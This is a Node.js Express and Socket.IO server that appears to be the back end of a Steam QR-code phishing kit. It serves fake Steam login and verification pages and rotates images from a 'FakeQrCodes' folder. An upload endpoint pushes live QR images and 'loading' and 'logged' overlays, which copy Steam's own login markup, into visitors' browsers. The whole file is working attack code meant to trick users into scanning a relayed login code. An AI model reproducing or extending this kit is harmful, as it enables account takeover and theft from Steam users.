const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const PORT = 3000;
let imageData = ''; // Variable to hold the current image data
let automaticImageChange = true; // To control the automatic image change
let changeImageInterval;
let resetImageInterval;
let isLoadingWas=false;

let overlayHtml =`<div id="QrCodeOverlay" class="qrlogin_Overlay_2VJKT"><div id="QrLoginBox" class="qrlogin_Box_2Lr2C">`
let loadingHtml=`<div id="QrLoginLoading" class="qrlogin_Loading_3wHZW qrlogin_Small_2qsUN"></div>`
let loggedHtml=`
<svg version="1.1" id="base" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="256px" height="256px" viewBox="0 0 256 256" style="width: 45px; height: 45px;">
<polyline fill="none" stroke="#fff" stroke-width="24" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" points="49.5,147.75 95,210.75 206.5,45.25 "></polyline>
</svg>
`
// Serve static files
app.use(express.static(path.join(__dirname, 'Steam_login')));
app.use(express.static(path.join(__dirname, 'Verify_page')));
app.use(express.static(path.join(__dirname, 'Frame')));

// Function to read image files from a directory
const imageFiles = fs.readdirSync(path.join(__dirname, 'FakeQrCodes'));

// Function to set the image data from the specified file
function setImageData(file) {
    fs.readFile(path.join(__dirname, 'FakeQrCodes', file), (err, data) => {
        if (err) {
            console.error(err);
        } else {
            imageData = 'data:image/png;base64,' + data.toString('base64');
            io.emit('image', imageData);
        }
    });
}

// Change the image every 1 second
function changeImage() {
    const randomImage = imageFiles[Math.floor(Math.random() * imageFiles.length)];
    setImageData(randomImage);
}

// Start automatic image change after 30 seconds
function startAutomaticImageChange() {
    changeImageInterval = setInterval(() => {
        if (automaticImageChange) {
            changeImage();
        }
    }, 1000);
}

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.post('/upload-image', (req, res) => {
    const status = req.body.status;
    const image = req.body.image;
    automaticImageChange = false;
    if (status === 'active') {
        console.log('Status is active.');
        io.emit('image', image);
    }
    else if (status === 'loading'){
        io.emit('add-class', 'QrCode', 'qrlogin_Blur');
        io.emit('add-html-end', 'QrCodeBlock', overlayHtml);
        io.emit('add-html-end', 'QrLoginBox',loadingHtml);
        isLoadingWas=true;
    }
    else if (status === 'logged') {
        console.log('Status is logged');
        if(isLoadingWas===false){
            console.log("loading not was")
            io.emit('add-class', 'QrCode', 'qrlogin_Blur');
            io.emit('add-html-end', 'QrCodeBlock', overlayHtml);
        }
        if(isLoadingWas === true){

            io.emit('remove-html-by-id', 'QrLoginLoading');
        }
        io.emit('add-html-end', 'QrLoginBox',loggedHtml);
        setTimeout(() => {
            io.emit('remove-html-by-id', 'QrCodeOverlay')
            io.emit('remove-class', 'QrCode', 'qrlogin_Blur');
            io.emit('refresh');
            automaticImageChange = true;
            startAutomaticImageChange();
        }, 3000);
    }



    clearInterval(changeImageInterval); // Stop automatic image change
    clearTimeout(resetImageInterval); // Clear the reset interval if any
    resetImageInterval = setTimeout(() => {
        automaticImageChange = true;
        startAutomaticImageChange();
    }, 30000); // Start automatic image change after 30 seconds
    res.send('Image received and broadcasted successfully');
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

io.on('connection', (socket) => {
    console.log('A client connected');
    changeImage();
    startAutomaticImageChange(); // Start changing images immediately upon connection
});

server.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});


